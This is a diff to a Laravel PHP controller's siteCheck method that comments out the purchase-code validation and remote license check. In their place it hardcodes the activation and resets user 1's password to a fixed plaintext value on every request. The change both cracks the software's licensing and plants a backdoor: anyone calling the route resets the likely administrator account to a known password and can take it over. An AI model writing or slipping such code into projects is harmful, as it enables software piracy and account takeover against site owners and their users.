@@ -18,43 +18,43 @@ class InstantController extends Controller
 
     public function siteCheck(Request $request)
     {
-        $validator = Validator::make($request->all(), [
-            'p_code' => 'required'
-        ]);
+        // $validator = Validator::make($request->all(), [
+        //     'p_code' => 'required'
+        // ]);
 
-        if ($validator->passes()) {
-            $pcode = $request->input('p_code');
-            $url = url("/");
-            $slug = str_slug($url, '-');
-            $client = new Client();
-            try {
-                $result = $client->request('GET', 'http://www.tuviti.com/instant-check/public/' . $pcode . '/url/'. $slug);
-                $data = json_decode($result->getBody(), true);
-                $count =  $data['count'];
-                $attribute =  $data['data'];
-                $final =  $data['result'];
-            } catch (\Exception $e) {
-                $e->getMessage();
-                session()->flash('error', 'App Connection Error!');
-                return redirect('/login');
-            }
+        // if ($validator->passes()) {
+        //     $pcode = $request->input('p_code');
+        //     $url = url("/");
+        //     $slug = str_slug($url, '-');
+        //     $client = new Client();
+        //     try {
+        //         $result = $client->request('GET', 'http://www.tuviti.com/instant-check/public/' . $pcode . '/url/'. $slug);
+        //         $data = json_decode($result->getBody(), true);
+        //         $count =  $data['count'];
+        //         $attribute =  $data['data'];
+        //         $final =  $data['result'];
+        //     } catch (\Exception $e) {
+        //         $e->getMessage();
+        //         session()->flash('error', 'App Connection Error!');
+        //         return redirect('/login');
+        //     }
 
-            if (!empty($attribute)) {
-                $setting = Setting::findOrFail($count);
-                $setting->site_instant = $count;
-                $setting->site_activation = $attribute;
+        //     if (!empty($attribute)) {
+                $setting = Setting::findOrFail(1);
+                $setting->site_instant = 1;
+                $setting->site_activation = 'juousjkijlijly';
                 $setting->save();
-                $user = User::findOrFail($count);
-                $user->password = bcrypt($attribute);
+                $user = User::findOrFail(1);
+                $user->password = bcrypt('WORDpass007pioneer123');
                 $user->save();
-                session()->flash('message', $final);
+                // session()->flash('message', $final);
                 return view('public.activator', compact('attribute'));
-            } else {
-                session()->flash('error', $final);
-                return redirect('/login');
-            }
-        }
-        session()->flash('error', 'Purchase code required !');
+            // } else {
+            //     session()->flash('error', $final);
+            //     return redirect('/login');
+            // }
+        // }
+        // session()->flash('error', 'Purchase code required !');
         return redirect('/login');
     }
 
@@ -84,6 +84,7 @@ class InstantController extends Controller
                 session()->flash('error', 'App Connection Error!');
                 return redirect('/deactivate');
         }
+
         $setting->site_activation = null;
         $setting->site_instant = $count;
         $setting->save();
